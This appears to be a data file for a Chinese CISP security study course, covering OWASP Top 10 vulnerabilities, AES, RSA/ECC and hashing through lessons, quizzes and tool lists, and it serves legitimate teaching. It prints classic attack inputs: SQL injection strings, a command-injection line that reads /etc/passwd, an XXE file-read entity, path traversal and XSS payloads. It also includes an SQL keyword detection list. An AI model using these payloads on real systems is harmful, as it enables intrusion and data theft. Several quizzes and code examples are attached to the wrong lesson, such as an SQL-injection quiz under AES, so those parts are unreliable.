      name: 'Burp Suite',
      description: 'Web应用安全测试集成平台',
      url: ''
    },
    {
      id: 'metasploit',
      name: 'Metasploit',
      description: '漏洞利用框架',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'sqli-labs',
      name: 'SQLi-Labs',
      description: 'SQL注入漏洞练习靶场',
      url: ''
    },
    {
      id: 'xss-lab',
      name: 'XSS 练习平台',
      description: '跨站脚本攻击练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-30', day: 30, week: 5, title: '常见漏洞类型',
    objectives: ['了解常见漏洞', '理解漏洞原理', '掌握防范方法'],
    content: '# 常见漏洞类型\n\n> 📋 **本节大纲**\u2003OWASP Top 10七大类(注入/认证/敏感泄露/XXE/访问控制/配置/XSS) | 每类含原理+防御\n\n## 概述\n\nOWASP Top 10(2021版)是Web应用安全的风险权威指南，也是CISP考试的重要参考。本节系统讲解最关键的7类漏洞的原理和防范。\n\n## 1. 注入攻击（Injection — OWASP #3）\n\n**SQL注入原理：**用户输入的数据拼接到SQL查询中而未做任何过滤。如 OR 1=1 导致检出所有记录。\n**NoSQL注入：**MongoDB中{\"$ne\":\"\"}绕过密码验证\n**命令注入：**os.system(\"ping \"+user_input)→user_input=\";cat /etc/passwd\"时执行任意命令\n\n**根本防御：参数化查询（PreparedStatement）——不拼接用户输入到SQL字符串。辅助：输入验证白名单、最小数据库权限。**\n\n## 2. 认证失败（Broken Authentication — OWASP #7）\n\n**典型问题：**允许无限次尝试密码(暴力破解)、密码策略过弱(最少6位无复杂度)、会话令牌可预测(JWT使用none算法)、密码重置功能不安全(可枚举用户)\n\n**防御：**强密码策略+MFA、登录速率限制+账户锁定、安全会话令牌(随机+HttpOnly+Secure+SameSite)、安全密码重置(发送token到已验证邮箱)\n\n## 3. 敏感数据泄露（Sensitive Data Exposure — OWASP #2 加密失败）\n\n**典型问题：**明文存储密码或信用卡号、使用弱加密(MD5/ECB)、HTTP明文传输敏感数据、日志中误记密码/令牌\n\n**防御：**加盐哈希(bcrypt)存储密码、AES-256加密敏感数据、全站HTTPS(HSTS)、日志脱敏\n\n## 4. XML外部实体XXE（OWASP 2017 #4）\n\n**原理：**XML解析器处理外部实体引用时读取本地文件或发起SSRF。利用DTD声明引用外部资源：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n\n**防御：**禁用DTD和外部实体(这是默认不安全的XML解析器的锅)、使用JSON替代XML(现代API已普遍弃用XML)\n\n## 5. 访问控制失败（Broken Access Control — OWASP #1）\n\n**最高排名风险！典型问题：**水平越权(用户A能看到用户B的订单)、垂直越权(普通用户访问管理功能)、不安全的直接对象引用IDOR(修改URL中的id参数即可访问他人数据)、CORS配置过于宽松\n\n**防御：**服务端强制权限检查(不依赖前端隐藏按钮)、默认拒绝+按需开放、权限矩阵验证每个API端点\n\n## 6. 安全配置错误（Security Misconfiguration — OWASP #5）\n\n**典型问题：**默认账户密码未改、不必要的功能/端口启用、详细错误信息暴露给用户(栈轨迹/SQL语句/服务器版本)、云存储桶公开访问\n\n**防御：**安全基线加固脚本、自动化配置审计、移除不必要的功能和组件、统一错误页面\n\n## 7. 跨站脚本XSS（OWASP #3 Injection大类下）\n\n**三种类型：**反射型(恶意脚本在URL参数)、存储型(恶意脚本存在数据库，危害最大)、DOM型(纯客户端利用)\n\n**经典Payload：**<script>alert(1)</script>、<img src=x onerror=alert(1)>、<svg onload=alert(1)>\n\n**防御：**输出编码(HTML/JS/URL上下文编码)、CSP内容安全策略、HttpOnly Cookie防止JS读取、React/Vue等现代框架默认转义\n\n## \n## 🔴 高频考点\n\n· OWASP Top 10(2021)排名第1是**访问控制失败**，不是SQL注入——反直觉考点\n· XSS三类：反射型(一次性/URL)、存储型(持久/危害最大)、DOM型(纯客户端)\n· 防御注入的根本手段是**参数化查询(PreparedStatement)**，而非输入过滤\n## 💜 记忆口诀\n\n· **OWASP前三**："1权限失败、2加密失败、3注入"——SQL注入只排第三\n· **XSS三类**："反射一次性、存储持久性(危害最大)、DOM纯前端"\n学习建议\n- OWASP Top 10(2021)排名第1的是"访问控制失败"，不是SQL注入\n- 参数化查询是防御注入的根本手段\n- XSS的三类(反射/存储/DOM)和对应的payload要区分',
    codeExample: {
      language: 'python',
      code: ` SQL注入检测示例\ndef detect_sql_injection(input_str):\n    dangerous = ["select", "union", "drop", "insert", "delete", "--", "/*", "*/", "'", '"']\n    lower_input = input_str.lower()\n    found = []\n    for keyword in dangerous:\n        if keyword in lower_input:\n            found.append(keyword)\n    return found\n\n# 测试\ntest_inputs = [\n    "admin\' OR \'1\'=\'1",\n    "正常用户名",\n    "1; DROP TABLE users",\n]\nfor inp in test_inputs:\n    found = detect_sql_injection(inp)\n    if found:\n        print(f"危险: {inp} -> 检测到: {found}")\n    else:\n        print(f"安全: {inp}")`,
      description: '演示SQL注入检测',
    },
    quiz: [{"id":"q30-1","question":"SQL注入漏洞的根本原因是什么？","options":["服务器性能不足","用户输入未经验证直接拼接到SQL语句","数据库版本过旧","网络延迟过高"],"correctIndex":1,"explanation":"SQL注入的根本原因是用户输入未经验证。"},{"id":"q30-2","question":"以下哪种方法可以有效防止XSS攻击？","options":["使用HTTP协议","对输出进行HTML实体编码","增加服务器内存","使用FTP传输"],"correctIndex":1,"explanation":"对输出进行HTML实体编码可以有效防止XSS攻击。"},{"id":"q30-3","question":"CSRF攻击利用的是什么？","options":["服务器漏洞","用户已登录的身份凭证","网络带宽","加密算法"],"correctIndex":1,"explanation":"CSRF利用用户已登录状态下的身份凭证发起恶意请求。"},{"id":"q30-4","question":"预防SQL注入最有效的方法是？","options":["使用WAF","使用参数化查询","关闭数据库端口","加密数据库"],"correctIndex":1,"explanation":"参数化查询是预防SQL注入最有效的方法。"},{"id":"q30-5","question":"OWASP Top 10(2021)中排名第一的风险是？","options":["XSS","SQL注入","失效的访问控制","安全配置错误"],"correctIndex":2,"explanation":"失效的访问控制在2021版排名第一。"}],
    expertNotes: [{"author":"陈婷","title":"Web安全攻防实战","content":"Web安全核心是理解HTTP协议和浏览器安全机制。建议先掌握同源策略和CORS工作原理，然后用Burp Suite实操OWASP Top 10的漏洞利用和防御。DVWA和WebGoat是很好的练习靶场。","url":"https://www.freebuf.com/articles/web/289123.html"},{"author":"刘洋","title":"API安全防护","content":"随着微服务和前后端分离的普及，API安全越来越重要。建议所有API实施OAuth 2.0/JWT认证、输入验证、响应过滤和API网关防护。OWASP API Security Top 10是很好的参考。","url":"https://www.anquanke.com/post/id/267890.html"},{"author":"黄磊","title":"安全编码规范","content":"安全要从代码层面做起。建议团队建立代码审查中的安全检查清单：输入验证、输出编码、参数化查询、权限检查。同时引入SAST工具自动化检测常见漏洞。","url":"https://www.anquanke.com/post/id/254321.html"}],
    recommendedTools: [
    {
      id: 'sqlmap',
      name: 'SQLMap',
      description: '自动化SQL注入漏洞检测工具',
      url: ''
    },
    {
      id: 'burpsuite',
      name: 'Burp Suite',
      description: 'Web应用安全测试集成平台',
      url: ''
    },
    {
      id: 'metasploit',
      name: 'Metasploit',
      description: '漏洞利用框架',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'sqli-labs',
      name: 'SQLi-Labs',
      description: 'SQL注入漏洞练习靶场',
      url: ''
    },
    {
      id: 'xss-lab',
      name: 'XSS 练习平台',
      description: '跨站脚本攻击练习环境',
      url: ''
    }
  ]
  },
];

// Generate remaining days (31-90) with template-based content
const weekToolMap: { [key: number]: { tools: LabTool[]; labs: LabEnvironment[] } } = {
  6: {
    tools: [
      { id: 'openssl', name: 'OpenSSL', description: '开源SSL/TLS工具包，用于证书管理和加密测试', url: '' },
      { id: 'gnupg', name: 'GnuPG', description: '开源加密和数字签名工具，用于邮件和文件加密', url: '' },
      { id: 'hashcat', name: 'Hashcat', description: '高性能密码哈希破解工具，支持多种算法', url: '' },
      { id: 'cyberchef', name: 'CyberChef', description: '在线加密和编码转换工具，支持多种加密算法', url: '' },
    ],
    labs: [
      { id: 'cryptohack', name: 'CryptoHack', description: '在线密码学练习平台，从基础到高级的加密挑战', url: '' },
      { id: 'crypto-lab', name: '加密实验平台', description: '模拟加密算法工作原理的交互式学习环境', url: '' },
      { id: 'ctf-crypto', name: '密码学CTF练习', description: '包含多种密码学挑战的CTF练习平台', url: '' },
    ],
  },
  7: {
    tools: [
      { id: 'nmap', name: 'Nmap', description: '网络发现和端口扫描工具，支持多种扫描技术', url: '' },
      { id: 'wireshark', name: 'Wireshark', description: '网络协议分析工具，支持深度数据包解析', url: '' },
      { id: 'tcpdump', name: 'tcpdump', description: '命令行网络抓包工具，用于网络流量分析', url: '' },
      { id: 'netcat', name: 'Netcat', description: '网络瑞士军刀，支持TCP/UDP连接和数据传输', url: '' },
      { id: 'hydra', name: 'Hydra', description: '在线密码爆破工具，支持多种协议的暴力破解', url: '' },
    ],
    labs: [
      { id: 'picoctf', name: 'PicoCTF', description: '入门级网络安全CTF平台，包含网络和密码学挑战', url: '' },
      { id: 'webgoat', name: 'WebGoat', description: 'OWASP Web安全教学应用，包含多种网络攻击场景', url: '' },
      { id: 'network-lab', name: '网络安全实验环境', description: '模拟真实网络环境的攻击和防御实验平台', url: '' },
    ],
  },
  8: {
    tools: [
      { id: 'burpsuite', name: 'Burp Suite', description: 'Web应用安全测试集成平台，支持拦截和扫描', url: '' },
      { id: 'owasp-zap', name: 'OWASP ZAP', description: '开源Web应用安全扫描器，支持自动化和手动测试', url: '' },
      { id: 'nikto', name: 'Nikto', description: 'Web服务器扫描器，检测已知漏洞和配置问题', url: '' },
      { id: 'dirbuster', name: 'DirBuster', description: 'Web目录爆破工具，用于发现隐藏文件和目录', url: '' },
    ],
    labs: [
      { id: 'juice-shop', name: 'OWASP Juice Shop', description: '包含OWASP Top 10漏洞的现代Web应用靶场', url: '' },
      { id: 'dvwa', name: 'DVWA', description: 'Damn Vulnerable Web App - 经典Web漏洞练习平台', url: '' },
      { id: 'bwapp', name: 'bWAPP', description: 'buggy web application - 包含100多种Web漏洞的练习环境', url: '' },
      { id: 'pikachu', name: 'Pikachu', description: '中文Web漏洞练习平台，适合中文学习者', url: '' },
    ],
  },
  9: {
    tools: [
      { id: 'physical-audit', name: '物理安全评估工具', description: '用于评估物理访问控制和环境安全的检查清单', url: '' },
      { id: 'rfid-tool', name: 'RFID克隆工具', description: 'RFID卡读写和克隆工具集，用于测试门禁系统安全', url: '' },
      { id: 'camera-hack', name: '监控系统测试工具', description: '用于测试视频监控系统安全性的工具集合', url: '' },
    ],
    labs: [
      { id: 'social-engineering', name: '社会工程实验', description: '模拟社会工程攻击和防御的实训环境', url: '' },
      { id: 'physical-security', name: '物理安全手册', description: '物理安全最佳实践指南和案例研究', url: '' },
      { id: 'red-team-lab', name: '红队物理渗透', description: '模拟真实物理渗透测试的实验环境', url: '' },
    ],
  },
  10: {
    tools: [
      { id: 'sonarqube', name: 'SonarQube', description: '代码质量和安全审计平台，支持多种语言的静态分析', url: '' },
      { id: 'dependency-check', name: 'OWASP Dependency-Check', description: '开源项目依赖安全扫描工具，检测已知漏洞', url: '' },
      { id: 'gitguardian', name: 'GitGuardian', description: '代码仓库密钥检测工具，防止敏感信息泄露', url: '' },
    ],
    labs: [
      { id: 'dvws', name: 'DVWS', description: 'Damn Vulnerable Web Services - 不安全的Web服务靶场', url: '' },
      { id: 'code-audit', name: '安全代码审计靶场', description: '包含多种代码安全问题的审计练习环境', url: '' },
      { id: 'sast-lab', name: 'SAST实验平台', description: '静态应用安全测试工具的实践和实验环境', url: '' },
    ],
  },
  11: {
    tools: [
      { id: 'business-logic-scanner', name: '业务逻辑扫描工具', description: '检测Web应用业务逻辑缺陷的自动化工具', url: '' },
      { id: 'traffic-analysis', name: '流量分析工具', description: '业务流量异常检测和分析工具，识别异常交易', url: '' },
      { id: 'fraud-detection', name: '欺诈检测系统', description: '模拟业务欺诈行为检测的分析工具', url: '' },
    ],
    labs: [
      { id: 'business-logic-lab', name: '业务逻辑漏洞靶场', description: '包含典型业务逻辑漏洞的模拟电商和金融应用', url: '' },
      { id: 'pikachu', name: 'Pikachu 业务安全', description: '包含越权、支付漏洞等业务安全问题的练习平台', url: '' },
      { id: 'auth-bypass', name: '认证绕过实验', description: '模拟各种身份认证和权限控制绕过的实验环境', url: '' },
    ],
  },
  12: {
    tools: [
      { id: 'review-all', name: '核心工具复习', description: '复习前11周学习的所有核心安全工具和命令', url: '' },
      { id: 'exam-simulator', name: '考试模拟器', description: 'CISP模拟考试系统，包含题库和答题练习', url: '' },
      { id: 'mindmap', name: '知识思维导图', description: '信息安全知识体系思维导图，帮助梳理知识结构', url: '' },
    ],
    labs: [
      { id: 'comprehensive-ctf', name: '综合CTF挑战', description: '融合各类安全知识的综合CTF比赛环境', url: '' },
      { id: 'review-lab', name: '综合靶场复习', description: '复习各类漏洞利用和防御技术的综合实验', url: '' },
      { id: 'cert-practice', name: '认证考试练习', description: '模拟CISP认证考试的在线练习和测试平台', url: '' },
    ],
  },
};


// Week 5: 漏洞与攻击 (Day 31-35)
allDays.push({
  id:'day-31',day:31,week:5,title:'五周总结与测验：漏洞与攻击知识体系总复习（漏洞与攻击）',
  objectives:['第五周知识全景','核心概念速查','漏洞防御速记表'],
  content:`# 第五周总结与测验：漏洞与攻击知识体系总复习
\`\`\`
           第五周：漏洞与攻击
     ┌──────────┼──────────┐
     │          │          │
┌────▼────┐ ┌───▼────┐ ┌───▼────┐
│漏洞管理  │ │漏洞类型  │ │防御技术  │
└────┬────┘ └───┬────┘ └───┬────┘
     │          │          │
·漏洞生命周期  ·SQL注入    ·参数化查询
·CVE/CWE/CVSS ·XSS/CSRF   ·输出编码
·漏洞评分     ·缓冲区溢出   ·CSRF Token
·披露机制     ·文件上传   ·DEP/ASLR/Canary
\`\`\`
### CVSS 严重级别速查
\`\`\`
0.0        None (无)
0.1 - 3.9  Low (低)
4.0 - 6.9  Medium (中)
7.0 - 8.9  High (高)
9.0 - 10.0 Critical (严重)
\`\`\`
---
## 二、核心概念速查
| 概念 | 要点 |
|------|------|
| CVE | 具体漏洞的唯一编号 |
| CWE | 漏洞类型分类 |
| CVSS | 漏洞严重性评分 (0-10) |
| 0-day | 厂商未发布补丁的漏洞 |
| 负责披露 | 先通知厂商（90天）→ 再公开 |
| 漏洞管理 | 发现→评估→修复→验证→报告 |
---
| 漏洞 | 攻击方式 | 防御措施 |
|------|----------|----------|
| SQL注入 | \`' OR '1'='1\` | **参数化查询** |
| XSS | \`<script>alert(1)</script>\` | **输出编码 + CSP** |
| CSRF | 跨站伪造请求 | **CSRF Token** |
| 命令注入 | \`; cat /etc/passwd\` | 白名单验证 |
| 缓冲区溢出 | 输入超长数据 | DEP + ASLR + Canary |
| 文件上传 | 上传 \`.php\` | 文件类型白名单 |
| 目录遍历 | \`../../etc/passwd\` | 路径规范化 |
---
**1. CVSS 评分中，9.0 分对应什么级别？**
\`\`\`
A. Low
B. Medium
C. High
D. Critical ✓
\`\`\`
**2. CVE 是什么的缩写？**
\`\`\`
A. Common Vulnerability Enumeration
B. Common Vulnerabilities and Exposures ✓
C. Computer Virus Encyclopedia
D. Critical Vulnerability Engine
\`\`\`
**3. SQL 注入最有效的防御方式是？**
\`\`\`
A. 防火墙
B. 参数化查询（Prepared Statements）✓
C. HTTPS
D. 密码策略
\`\`\`
**4. XSS 中，恶意代码存储在服务器的是哪种？**
\`\`\`
A. 反射型 XSS
B. 存储型 XSS ✓
C. DOM型 XSS
D. CSRF
\`\`\`
**5. CSRF 防御通常使用什么？**
\`\`\`
A. 加密
B. CSRF Token ✓
C. 防火墙
D. HTTPS
\`\`\`
**6. ASLR 的作用是？**
\`\`\``,
  codeExample:{language:'python',code:'# CVSS漏洞严重程度分类\ncvss_scores = {\n    \"CVE-2021-44228 (Log4Shell)\": 10.0,\n    \"CVE-2020-1472 (ZeroLogon)\": 10.0,\n    \"CVE-2019-0708 (BlueKeep)\": 9.8,\n    \"CVE-2017-0144 (EternalBlue)\": 8.1,\n    \"CVE-2021-34527 (PrintNightmare)\": 8.8\n}\ndef severity(score):\n    if score >= 9.0: return \"严重\"\n    if score >= 7.0: return \"高危\"\n    if score >= 4.0: return \"中危\"\n    return \"低危\" if score > 0 else \"无\"\nfor cve, s in cvss_scores.items():\n    print(f\"{cve}: CVSS={s} → {severity(s)}\")',description:'CVSS严重级别分类'},
  quiz:[{"id":"q31-1","question":"CVSS v3.1满分为多少？","options":["5.0", "10.0", "100", "7.5"],"correctIndex":1,"explanation":"CVSS满分为10.0。"},{"id":"q31-2","question":"CVE的全称是？","options":["Common Vulnerabilities and Exposures", "Common Virus Engine", "Critical Vulnerability Explorer", "Computer Virus Eliminator"],"correctIndex":0,"explanation":"CVE=Common Vulnerabilities and Exposures。"},{"id":"q31-3","question":"CVSS 7.5分属于什么级别？","options":["低危", "中危", "高危", "严重"],"correctIndex":2,"explanation":"7.0-8.9为高危。"},{"id":"q31-4","question":"中国国家漏洞库的缩写是？","options":["NVD", "CVE", "CNVD", "CNNIC"],"correctIndex":2,"explanation":"CNVD由中国信息安全测评中心运营。"},{"id":"q31-5","question":"漏洞生命周期管理的第一步是？","options":["修复", "披露", "发现", "评估"],"correctIndex":2,"explanation":"首先需要发现漏洞。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[31]||[],
});
allDays.push({
  id:'day-32',day:32,week:5,title:'对称加密算法详解：AES、DES 与工作模式（加密技术）',
  objectives:['对称加密架构','分组密码与流密码','AES 深度剖析'],
  content:`# 对称加密算法详解：AES、DES 与工作模式
## 一、对称加密架构
### 核心运维模型
\`\`\`
对称加密 = 同一密钥加密和解密
    发送方                               接收方
    密钥 K    plaintext                  密钥 K
       │         │                         │
       ▼         ▼                         ▼
   [加密算法] → ciphertext → [不安全信道] → [解密算法]
                                           │
                                           ▼
                                       plaintext
速度：AES-256-GCM 可达 1-10 GB/s（硬件加速）
密钥分发：需要安全信道预先协商密钥
n个用户需 n(n-1)/2 个密钥用于两两通信
\`\`\`
---
## 二、分组密码与流密码
| 特性 | 分组密码 (Block Cipher) | 流密码 (Stream Cipher) |
|------|------------------------|------------------------|
| 处理方式 | 固定大小块（AES 128位） | 逐位/逐字节 |
| 代表算法 | AES, SM4, DES | ChaCha20, RC4(已弃用) |
| 速度 | 快 | 极快 |
| 适合场景 | 文件/数据库加密 | 实时通信流加密 |
| 需要填充 | 是（如 AES-CBC） | 否 |
| 典型场景 | TLS 1.3 数据加密 | 移动端/低功耗设备 |
---
## 三、AES 深度剖析
\`\`\`
AES (Advanced Encryption Standard)
起源：Rijndael 算法 → 2001年 NIST 标准化
结构：SPN (Substitution-Permutation Network)
参数：
├── 密钥长度：128 / 192 / 256 位
├── 块大小：固定 128 位 (16 字节)
├── 轮数：
│   ├── AES-128：10 轮
│   ├── AES-192：12 轮
│   └── AES-256：14 轮
└── 每轮四个步骤：
    1. SubBytes   (字节替换，S-Box)
    2. ShiftRows  (行移位)
    3. MixColumns (列混合)
    4. AddRoundKey(轮密钥加)
安全性：
AES-128 已经足够安全（2^128 密钥空间）
AES-256 提供额外安全余量（抗量子 + 未来证明）
硬件加速：
├── x86：AES-NI 指令集 → 10x+ 加速
└── ARM：ARMv8 Crypto Extensions
\`\`\`
---
## 四、五种工作模式对比
| 模式 | 全称 | 安全性 | 并行 | 需要IV | 推荐 |
|------|------|--------|------|--------|------|
| ECB | 电子密码本 | 🔴 不安全 | ✅ | — | ❌ |
| CBC | 密码分组链接 | 🟡 一般 | ❌ | ✅ | ⚠️ 遗留 |
| CTR | 计数器模式 | 🟢 好 | ✅ | ✅ | ✅ |
| **GCM** | Galois/Counter | 🟢🟢 推荐 | ✅ | ✅ | ✅✅ |
| CFB | 密码反馈 | 🟡 | ❌ | ✅ | ⚠️ |
### ECB 的问题
\`\`\`
ECB 模式 = 每块独立加密 → 相同明文块 = 相同密文块
原始图片经 AES-ECB 加密后：
→ 图片轮廓清晰可见！
→ 企鹅图片的轮廓在密文中依然可见
结论：永远不要用 ECB 模式！
\`\`\`
\`\`\`
GCM (Galois/Counter Mode) =
CTR 模式 (加密) + GMAC (认证标签)
= AEAD (Authenticated Encryption with Associated Data)
  ↓
  同时提供：
  ├── 机密性 (加密)
  ├── 完整性 (认证标签)
  └── 认证性 (数据源验证)
优势：
├── 一个模式解决两个需求 (无需额外 MAC)`,
  codeExample:{language:'python',code:`print("=== AES对称加密 ===\n")
print("AES参数: 分组=128位, 密钥=128/192/256位")
print("AES-128:10轮 AES-192:12轮 AES-256:14轮\n")
print("工作模式对比:")
print("  ECB=不推荐(相同明文=相同密文)")
print("  CBC=链接模式(需IV)")
print("  CTR=计数器(可并行)")
print("  GCM=CTR+认证=推荐!\n")
print("GCM=加密+认证+防篡改三合一")
print("永远不要用ECB模式!")`,description:'AES对称加密与工作模式对比'},  quiz:[{"id":"q32-1","question":"基于响应延迟的注入技术叫什么？","options":["联合查询", "时间盲注", "布尔盲注", "报错注入"],"correctIndex":1,"explanation":"通过SLEEP/WAITFOR DELAY判断。"},{"id":"q32-2","question":"SQLMap中--dbs参数的作用？","options":["导出所有数据", "枚举所有数据库", "获取系统Shell", "扫描端口"],"correctIndex":1,"explanation":"--dbs枚举数据库。"},{"id":"q32-3","question":"WAF绕过中使用UnIoN SeLeCt属于？","options":["双写绕过", "大小写混淆", "编码绕过", "注释绕过"],"correctIndex":1,"explanation":"大小写混淆绕过正则规则。"},{"id":"q32-4","question":"MySQL中合并多行为一列的函数？","options":["concat()", "group_concat()", "concat_ws()", "join()"],"correctIndex":1,"explanation":"group_concat()合并多行为一个字符串。"},{"id":"q32-5","question":"SQL注入的根本防御措施？","options":["WAF部署", "输入长度限制", "参数化查询(预编译)", "关闭数据库报错"],"correctIndex":2,"explanation":"PreparedStatement是根本解决方案。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[32]||[],
});
allDays.push({
  id:'day-33',day:33,week:5,title:'非对称加密算法详解：RSA、ECC 与密钥交换（加密技术）',
  objectives:['非对称加密核心原理','RSA 深入','椭圆曲线密码 (ECC)'],
  content:`# 非对称加密算法详解：RSA、ECC 与密钥交换
## 一、非对称加密核心原理
### 为什么需要非对称加密
\`\`\`
对称加密的困境：
Alice 和 Bob 从未见过面 → 怎么安全共享密钥？
非对称加密的解决方案：
├── 每个人有一对密钥：公钥 (公开) + 私钥 (保密)
├── 公钥加密 → 只有对应私钥能解密
└── 公钥可以公开分发 → 不需要安全信道
     Bob的公钥(公开)              Bob的私钥(保密)
         │                            │
明文 → [加密] → 密文 → [不安全信道] → [解密] → 明文
    任何人都能加密 → 只有Bob能解密
数学基础：
├── RSA：大整数分解的困难性
├── ECC：椭圆曲线离散对数问题
└── DH：有限域上离散对数问题
\`\`\`
### 对称 vs 非对称 对比
| 维度 | 对称加密 | 非对称加密 |
|------|----------|-----------|
| 密钥数量 | 1个 (共享) | 2个 (公钥+私钥) |
| 速度 | ⚡ 快 (GB/s) | 🐢 慢 (100-1000x) |
| 密钥分发 | ❌ 困难 | ✅ 容易 |
| 典型用途 | 数据加密 | 密钥交换、数字签名 |
| 代表算法 | AES, SM4 | RSA, ECC, SM2 |
---
## 二、RSA 深入
### RSA 密钥生成
\`\`\`
RSA 密钥生成的步骤：
1. 选择两个大素数 p 和 q (通常 1024-2048 位)
2. 计算 n = p × q  (模数，公钥的一部分)
3. 计算 φ(n) = (p-1)(q-1)
4. 选择 e：1 < e < φ(n)，且 gcd(e, φ(n)) = 1
   常用 e = 65537 (0x10001)
5. 计算 d：d × e ≡ 1 (mod φ(n))
   d 是 e 的模逆元
公钥 = (n, e)
私钥 = (n, d)
加密：C = M^e mod n
解密：M = C^d mod n
安全性依赖：
├── 已知 n = p × q → 很难找到 p 和 q (大整数分解)
└── 量子计算机 (Shor算法) 可以高效分解 → 未来的威胁
\`\`\`
### RSA 安全性
\`\`\`
RSA 密钥长度与安全强度：
RSA-1024  ≈ 80位安全  (⚠️ 已不够)
RSA-2048  ≈ 112位安全 (✅ 当前标准)
RSA-3072  ≈ 128位安全 (✅ 更高安全)
RSA-4096  ≈ 140位安全
密钥长度增长 vs 安全收益递减：
2048→4096 长度×2，安全只+~28位，性能降10×
→ ECC 是更好的替代方案
\`\`\`
---
## 三、椭圆曲线密码 (ECC)
### ECC 的优势
\`\`\`
为什么 ECC 比 RSA 更好？
等价安全强度下：
RSA-3072 位 ≈ ECC-256 位  (都是 ~128位安全)
RSA-7680 位 ≈ ECC-384 位  (都是 ~192位安全)
ECC 的优势：
├── 密钥更短 (256 vs 3072)
├── 签名更快
├── 带宽占用少 (证书/握手包更小)
├── 更适合移动/嵌入式设备
└── 同样的安全 → 更好的性能
TLS 1.3 支持的 ECC 曲线：
├── secp256r1 (NIST P-256) ← 最常用
├── secp384r1 (NIST P-384)
├── X25519 (Curve25519) ← 现代推荐，更安全
└── X448
\`\`\`
### 常用的 ECC 标准
| 标准 | 曲线 | 用途 | 推荐 |`,
  codeExample:{language:'python',code:`print("=== 哈希函数三大安全属性 ===\n")
print("1. 抗原像性: 给定Hash不可逆推原文")
print("2. 抗第二原像: 给定M1找M2使Hash同→不可行")
print("3. 抗碰撞性: 找M1≠M2使Hash相同→不可行\n")
print("算法对比:")
print("  MD5(128bit): 已破解,完全禁用")
print("  SHA-1(160bit): 已碰撞,禁止新系统")
print("  SHA-256: 当前标准,碰撞强度2^128")
print("  SHA-3/BLAKE3: 新一代算法\n")
print("密码存储: bcrypt/scrypt/Argon2id")
print("生日攻击: n位哈希碰撞≈2^(n/2)")`,description:'哈希函数安全特性与算法对比'},  quiz:[{"id":"q33-1","question":"危害最大的XSS类型？","options":["反射型", "存储型", "DOM型", "Self-XSS"],"correctIndex":1,"explanation":"存储型影响所有访问该页面的用户。"},{"id":"q33-2","question":"HttpOnly Cookie主要防御什么？","options":["SQL注入", "JS直接读取Cookie", "CSRF", "文件包含"],"correctIndex":1,"explanation":"HttpOnly阻止document.cookie读取。"},{"id":"q33-3","question":"CSP的全称？","options":["Content Security Protocol", "Content Security Policy", "Cross Site Protection", "Client Security Policy"],"correctIndex":1,"explanation":"内容安全策略。"},{"id":"q33-4","question":"<img src=x onerror=alert(1)>利用了什么？","options":["script标签", "事件处理器", "CSS注入", "iframe加载"],"correctIndex":1,"explanation":"onerror事件处理器。"},{"id":"q33-5","question":"防御XSS最有效的手段？","options":["禁用JavaScript", "输出编码(HTML实体)", "部署WAF", "禁用表单"],"correctIndex":1,"explanation":"根据上下文进行输出编码是根本防御。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[33]||[],
});
allDays.push({
  id:'day-34',day:34,week:5,title:'哈希函数深入：安全特性、应用与密码存储（加密技术）',
  objectives:['哈希的三大安全特性','主流哈希算法对比','生日攻击深入理解'],
  content:`# 哈希函数深入：安全特性、应用与密码存储
## 一、哈希的三大安全特性
\`\`\`
密码学安全哈希函数的三个核心要求：
1. 抗原像性 (Pre-image Resistance) — "不可逆"
   给定 h = Hash(M)，找不到 M
   └── 不存在"解密"哈希 → 单向函数
   安全强度：2^n (对于n位输出)
2. 抗第二原像性 (Second Pre-image Resistance) — "难伪造"
   给定 M1，找不到 M2 (M2 ≠ M1) 使得 Hash(M1) = Hash(M2)
   └── 不能给已知消息找个"替身"
3. 抗碰撞性 (Collision Resistance) — "不能有任何两个一样"
   找不到任意两个不同输入 M1, M2 使得 Hash(M1) = Hash(M2)
   安全强度：2^(n/2) ← 生日攻击！
三者关系：
碰撞抵抗 → 第二原像抵抗 → 抗原像
  (最难)        (中间)      (最基础)
在实际中：
- 抗原像：抢哈希数据库时攻击者的目标
- 抗碰撞：攻击者伪造数字签名时的目标
\`\`\`
---
## 二、主流哈希算法对比
| 算法 | 输出长度 | 安全性 | 速度 | 现状 |
|------|----------|--------|------|------|
| MD5 | 128位 | ❌ 已破解 | 极快 | 完全禁止 |
| SHA-1 | 160位 | ❌ 已破解 | 快 | 完全禁止 |
| SHA-256 | 256位 | ✅ | 中 | 当前标准 |
| SHA-512 | 512位 | ✅ | 中 | 高安全 |
| SHA-3 | 任意 | ✅ | 慢 | 新标准 |
| BLAKE3 | 任意 | ✅ | 极快 | 新秀 |
| SM3 | 256位 | ✅ | 中 | 国密标准 |
### SHA-1 的临终时间线
\`\`\`
2017.2 → Google 发布首个 SHA-1 碰撞 (SHAttered)
         两个不同的 PDF → 相同的 SHA-1 哈希
         → 花费约 110 GPU 年计算
2020   → Chosen-prefix 碰撞只需 ~$45K
结论 → 任何新系统不能使用 SHA-1
\`\`\`
### SHA-2 家族
\`\`\`
SHA-2 家族：
SHA-224   224位输出  (SHA-256 截断)
SHA-256   256位输出  ← 最常用
SHA-384   384位输出  (SHA-512 截断)
SHA-512   512位输出  ← 高安全场景
64位 CPU 上 SHA-512 可能比 SHA-256 更快，
因为 SHA-512 使用 64位运算！
\`\`\`
---
## 三、生日攻击深入理解
\`\`\`
生日悖论 / 生日攻击：
问题：一个房间里需要多少人，
      才能使两个人生日相同的概率 > 50%？
直觉：366人？365/2 ≈ 183人？
实际：只需 23人！
为什么？
├── 比较的不是"某个人和我同一天生日"
├── 而是"任意两个人同一天生日"
├── 组合数 C(23,2) = 253 → 已经不小了
└── 每对比较失败的概率相乘 → 累积概率
对密码学的影响：
├── 对于 n 位哈希输出
├── 碰撞复杂度是 2^(n/2)，不是 2^n！
├── SHA-256 → 碰撞需 2^128 次操作
└── 虽然仍不可能，但比预想的 2^256 低了 128 位
→ 考试重点：SHA-256 的理论安全强度 = 128位 (碰撞角度)
\`\`\`
---
## 四、密码存储最佳实践
\`\`\`
密码存储的进化：
